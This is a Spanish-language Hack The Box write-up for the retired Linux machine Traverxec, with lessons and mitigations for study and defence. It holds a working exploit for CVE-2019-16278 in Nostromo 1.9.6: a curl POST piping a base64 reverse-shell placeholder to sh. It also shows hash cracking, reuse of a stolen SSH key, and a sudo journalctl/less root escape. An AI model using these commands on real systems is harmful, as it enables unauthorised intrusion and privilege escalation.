---
machine: Traverxec
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, nostromo, cve, privesc]
---

# Traverxec — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Nostromo 1.9.6 es vulnerable a CVE-2019-16278: un traversal en `/%2e%2e/` permite ejecutar comandos como `www-data`. El directorio `~david/public_html` expone un `.htpasswd` cuyo hash se crackea y la contraseña se reutiliza en SSH. En la home hay un backup con una clave privada; `david` puede ejecutar `journalctl` con sudo y escapar a una shell root desde `less`.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH y `80` nostromo 1.9.6.
- `gobuster` encuentra `/~david/` y `/icons/`.
- La página principal menciona un servicio web minimalista.

## Enumeración

- `http://<IP>/~david/` lista un directorio personal con `.htpasswd`.
- El hash es `$1$` (MD5 crypt) y se crackea con `hashcat -m 500`.
- La contraseña obtenida se prueba en SSH para `david`.

## Foothold

Se explota CVE-2019-16278 con un POST a `/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh` y el comando en el cuerpo. La respuesta se puede usar para una reverse shell como `www-data`.

```bash
curl -s -X POST 'http://<IP>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo <BASE64_REVERSE_SHELL>|base64 -d|sh'
```

## Movimiento lateral

En `/home/david` hay `public_www` y un directorio `backup` con un `.tgz` que contiene `id_rsa`. La clave permite entrar como `david` por SSH.

```bash
tar -xzf ~/backup/home.tgz -C /tmp
ssh -i /tmp/id_rsa david@<IP>
```

## Escalada de privilegios

`david` puede ejecutar `/usr/bin/journalctl` como root. `journalctl` abre `less`, y desde `less` se lanza una shell con `!sh`; el proceso hereda los privilegios de sudo.

```bash
sudo /usr/bin/journalctl -f
!sh
```

## Evidencia

- Nostromo 1.9.6 y traversal en `/%2e%2e/`.
- `.htpasswd` y contraseña crackeada.
- Backup con clave privada y SSH como `david`.
- `journalctl` con sudo y escape por `less`.

## Lecciones aprendidas

- Un servidor web antiguo con traversal da ejecución sin autenticación.
- Los directorios personales no deben exponer `.htpasswd`.
- Un paginador privilegiado permite ejecutar comandos.

## Mitigación y detección

- Actualizar Nostromo y normalizar rutas.
- No publicar archivos de autenticación ni backups en el webroot.
- Restringir `journalctl` con sudo y usar `--no-pager`.

## Referencias

- [0xdf — Traverxec](https://0xdf.gitlab.io/2020/04/11/htb-traverxec.html)
- [IppSec — Traverxec](https://www.youtube.com/watch?v=6_C9ShH9v2w)
- [Hack The Box — Traverxec](https://app.hackthebox.com/machines/traverxec)
